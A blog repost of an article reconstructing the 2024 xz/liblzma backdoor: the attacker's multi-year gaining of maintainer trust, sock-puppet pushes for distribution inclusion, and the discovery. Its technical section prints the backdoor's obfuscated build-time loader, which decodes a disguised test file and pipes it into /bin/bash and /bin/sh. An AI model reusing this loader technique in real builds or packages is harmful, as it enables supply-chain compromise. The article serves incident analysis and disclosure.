<!DOCTYPE html ><html lang="zh"><head> <script src="https://fastly.jsdelivr.net/gh/0xarch/0xarch.github.io/files/post.js"></script><script src="https://fastly.jsdelivr.net/gh/0xarch/0xarch.github.io/files/ui.js"></script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/0xarch/0xarch.github.io/files/post.css"/><link rel="icon" href="/files/icon.svg"/><meta charset="utf-8"/><meta name="viewport" content="width:device-width,initial-scale=1.0"/><meta name="author" content="oxArch"/><meta name="description" content="_Please note: This is being updated in real time. The intent is to make sense of lots of simultaneous discoveries regarding this backdoor. last updated: 7:18 EST_

[原文章](https://boehs.org/node/everything-i-know-about-the-xz-backdoor)"/><meta name="keywords" content="Linux Open-Source-Software"/><meta http-equiv="content-language" content="zh-CN"/><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.2/css/all.min.css"/><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/0xarch/Wark/src/GNOME.colors.css"/><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/0xarch/Wark/src/GNOME.defs.css"/><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/0xarch/Wark/src/GNOME.preframe.css"/><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/0xarch/0xarch.github.io//files/modg.css"/><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/0xarch/0xarch.github.io//files/Cantarell/stylesheet.css"/><title>[转载] Everything I Know About the Xz Backdoor | 文章</title></head><body class="colorful" OCP="OVERRIDE" style="--color1:#3eaa60;--color2:#78b640"><header class="top"><div><div class="logo f_eaj"><svg fewu-logo xmlns='http://www.w3.org/2000/svg' width=48 height=48><circle n2 cx=21 cy=27 r=18 /><circle cx=21 cy=27 r=12 /><circle n2 cx=33 cy=15 r=12 /><circle cx=33 cy=15 r=8 /></svg><style>svg[fewu-logo]>*{fill:#fff}svg[fewu-logo]>*[n2]{fill:#3272d2}</style></div><nav class="index"><ul><li><a href="/">首页</a></li><li><a href="/archive/1">归档</a></li><li><a href="/category/1">分类</a></li><li><a href="/tag/1">标签</a></li><li><a href="/about/">关于</a></li><li><a href="/status/"><svg class="feather feather-tool" viewBox="0 0 24 24" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path></svg></a></li></ul></nav></div></header><div class="intro tac" id="intro"><div class="h1">[转载] Everything I Know About the Xz Backdoor</div></div><main class="content" id="content"><section class="small"><h2>前言</h2><p><em>Please note: This is being updated in real time. The intent is to make sense of lots of simultaneous discoveries regarding this backdoor. last updated: 7:18 EST</em></p><p><a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor">原文章</a></p></section><section><article class="block" id="markdown_fillContent"><h1>[转载] Everything I Know About the Xz Backdoor</h1><h3>2021</h3><p>JiaT75 (Jia Tan) creates their GitHub account.</p><p>The first commits they make are not to xz, but they are deeply suspicious. Specifically, they open a PR in libarchive: <a href="https://github.com/libarchive/libarchive/pull/1609">Added error text to warning when untaring with bsdtar</a>. This commit does a little more than it says. It replaces <code>safe_fprint</code> with an unsafe variant, potentially introducing another vulnerability. The code was merged without any discussion, and <del><a href="https://github.com/libarchive/libarchive/blob/master/tar/read.c#L374-L375">lives on to this day</a></del> (<a href="https://github.com/libarchive/libarchive/pull/2101">patched</a>). libarchive should also be considered compromised until proven otherwise.</p><h3>2022</h3><p>In 2022, pressure to add another maintainer to XZ is <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html">launched</a>.</p><p>Three days after this email, JiaT75 makes their first commit to xz: <a href="https://github.com/tukaani-project/xz/commit/aa75c5563a760aea3aa23d997d519e702e82726b">Tests: Created tests for hardware functions.</a>. Since this commit, they become a regular contributor to xz (they are currently the second most active). It’s unclear exactly when they became trusted in this repository.</p><blockquote><p><strong><a href="https://mastodon.social/@glyph/112180922900094371">Glyph</a></strong><br>@<a href="mailto:glyph@mastodon.social">glyph@mastodon.social</a></p><p>I really hope that this causes an industry-wide reckoning with the common practice of letting your entire goddamn product rest on the shoulders of one overworked person having a slow mental health crisis without financially or operationally supporting them whatsoever. I want everyone who has an open source dependency to read this message <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html">https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html</a></p><p>Mar 29, 2024, 20:43 226 retoots</p></blockquote><h3>2023</h3><p>JiaT75 merges their first commit <a href="https://github.com/tukaani-project/xz/pull/7">on Jan 7 2023</a><sup id="fnref1"><a href="#fn1">1</a></sup>, which gives us good indication into when they fully gain trust.</p><p>In March, the primary contact email in Google’s oss-fuzz is <a href="https://github.com/JiaT75/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd">updated</a> to be Jia’s, instead of <em>Lasse Collin</em>.</p><p>Testing infrastructure that will be used in this exploit is committed. Despite <em>Lasse Collin</em> being attributed as the author for this, Jia Tan committed it, and it was originally written by <em>Hans Jansen</em> in June: * * Commit: <a href="https://github.com/tukaani-project/xz/commit/ee44863ae88e377a5df10db007ba9bfadde3d314">liblzma: Add ifunc implementation to crc64_fast.c</a> * PR: <a href="https://github.com/tukaani-project/xz/pull/53">Replaced crc64_fast constructor with ifunc by hansjans162</a></p><p><em>Hans Jansen</em>’s account was seemingly made specifically to create this pull request. There is very little activity before and after. They will later push for the compromised version of XZ to be included in Debian.</p><p>In July, <a href="https://github.com/google/oss-fuzz/pull/10667">a PR</a> was opened in oss-fuzz to disable ifunc for fuzzing builds, due to issues introduced by the changes above. This appears to be deliberate to mask the malicious changes that will be introduced soon.</p><h3>2024</h3><p>A pull request for Google’s <a href="https://github.com/google/oss-fuzz/pull/11587">oss-fuzz is opened</a> that changes the URL for the project from <a href="http://tukaani.org/xz/">tukaani.org/xz/</a> to <a href="http://xz.tukaani.org/xz-utils/">xz.tukaani.org/xz-utils/</a>. <a href="http://tukaani.org/">tukaani.org</a> is hosted at <code>5.44.245.25</code> in Finland, at <a href="https://www.zoner.fi/">this</a> hosting company. The xz subdomain, meanwhile, points to GitHub pages. This furthers the amount of control Jia has over the project.</p><p>A commit containing the final steps required to execute this backdoor is added to the repository: * * Tests: <a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">Add a few test files</a> * Tests: <a href="https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89">Update two test files</a></p><h4>The discovery</h4><p>An email is sent to the oss-security mailing list: <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">backdoor in upstream xz/liblzma leading to ssh server compromise</a>, announcing this discovery, and doing it’s best to explain the exploit chain.</p><blockquote><p><strong><a href="https://mastodon.social/@AndresFreundTec/112180406142695845">AndresFreundTec</a></strong><br>@<a href="mailto:AndresFreundTec@mastodon.social">AndresFreundTec@mastodon.social</a></p><p>I was doing some micro-benchmarking at the time, needed to quiesce the system to reduce noise. Saw sshd processes were using a surprising amount of CPU, despite immediately failing because of wrong usernames etc. Profiled sshd, showing lots of cpu time in liblzma, with perf unable to attribute it to a symbol. Got suspicious. Recalled that I had seen an odd valgrind complaint in automated testing of postgres, a few weeks earlier, after package updates.</p><p>Really required a lot of coincidences.</p><p>Mar 29, 2024, 18:32 288 retoots</p></blockquote><p>A <a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27">gist</a> has been published with a very good high level technical overview and a “what you need to know”</p><p>I understand this chain even less than the original author, but here is me half reciting, half making sense of what’s happening:</p><details><summary>This isn't good yet, I'm still figuring it out</summary><p>Code is <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63">added</a> to the upstream tarballs that injects an obfuscated script from the files committed above to be “executed at the end of configure”. This code, in turn, “modifies <code>$builddir/src/liblzma/Makefile</code> to contain”</p><pre><code class="language-sh">am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
</code></pre><p>(you’ll notice this was the file added above) “which ends up as” (what ends up as?)</p><pre><code class="language-sh">sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr &quot;	 \-_&quot; &quot; 	_\-&quot; | xz -d | /bin/bash &gt;/dev/null 2&gt;&amp;1;
</code></pre><p>The sed reportedly transforms into</p><pre><code class="language-sh">####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir=&quot;../../$srcdir&quot;
fi
export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh
####World####
</code></pre><p>You’ll notice this script is piping one of these files attached in the above commits into a series of very very obfuscated head calls. And after deobfuscation of this script, it leads to a sh file attached in the email:</p><p><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1">injected.txt</a></p><p>There are a number of conditions identified that are required for the process to continue: * * Building with gcc and the gnu linker * only x86-64 linux * Running as part of a debian or RPM package build</p><p>The final binary reportedly is used in some way to bypass sshd authentication checks.</p></details><h4>A sudden push for inclusion</h4><p>A request for the vulnerable version to be included in Debian is opened by Hans: * * <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708">#1067708 - xz-utils: New upstream version available</a></p><p>A number of other, suspicious, anonymous name+number accounts with little former activity also push for its inclusion, including <em>misoeater91</em> and <em>krygorin4545</em>. <em>krygorin4545</em>’s PGP key was made 2 days prior to today.</p><blockquote><p>Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work.</p><p>I noticed this last week and almost made a valgrind bug. Glad to see it being fixed. Thanks Hans!</p></blockquote><p>The Valgrind bugs mentioned were <em>introduced</em> by this malicious injection, as noted in the email to OSS-Security:</p><blockquote><p>Subsequently the injected code (more about that below) caused valgrind errors and crashes in some configurations, due the stack layout differing from what the backdoor was expecting. These issues were attempted to be worked around in 5.6.1:</p></blockquote><p>A <a href="https://github.com/jamespfennell/xz/pull/2">pull request</a> to a go library by a 1password employee is opened asking to upgrade the library to the vulnerable version, however, it was all unfortunate timing. 1Password reached out by email referring me to this <a href="https://github.com/jamespfennell/xz/pull/2#issuecomment-2027836356">comment</a>, and everything seems to check out.</p><h4>HOWEVER</h4><p>A fedora contributor <a href="https://news.ycombinator.com/item?id=39866275">states</a> that <em>Jia</em> was pushing for its inclusion in Fedora as it contains “great new features”</p><p><em>Jia Tan</em> also <a href="https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2059417">attempted</a> to get it into Ubuntu days before the beta freeze.</p><p>As of 9:00 PM UTC, GitHub has suspended JiaT75’s account. Thanks?</p><h2>Footnotes</h2><ol><li id="fn1">Thanks @joeyh@hachyderm.io <a href="#fnref1">↩︎</a></li></ol></article></section><section class="small fit cclogo"><a class="Heading" href="https://creativecommons.org/">传播许可协议 <i class="fa-brands fa-creative-commons" aria-hidden="true"></i></a><div class="inner"></div></section><section><div class="pagination"><a class="arrow left nowrap disabled">← 已是最新</a><a class="arrow right nowrap" href="/read/17dzbQXJjaExpbnV45YyF5pS26ZuG/">Arch Linux 包收集 →</a><a class="top" href="#">Top</a></div></section></main><footer><section class="list"><div class="alc col"><h3>Fewu</h3><ul><li></li><li><a href="//github.com/0xarch/fewu">Source Code</a></li></ul><svg fewu-logo xmlns='http://www.w3.org/2000/svg' width=48 height=48><circle n2 cx=21 cy=27 r=18 /><circle cx=21 cy=27 r=12 /><circle n2 cx=33 cy=15 r=12 /><circle cx=33 cy=15 r=8 /></svg><style>svg[fewu-logo]>*{fill:#fff}svg[fewu-logo]>*[n2]{fill:#3272d2}</style></div><div class="alc col"><h3>Wacal Theme</h3><ul> <li>1.0.2</li></ul><div class="logo-of-theme"></div></div></section><section class="tac"><div class="copyr"></div></section></footer><div class="fix" id="toc"></div><div class="fix toc-con-button nomobile"><button>TOC</button></div></body></html>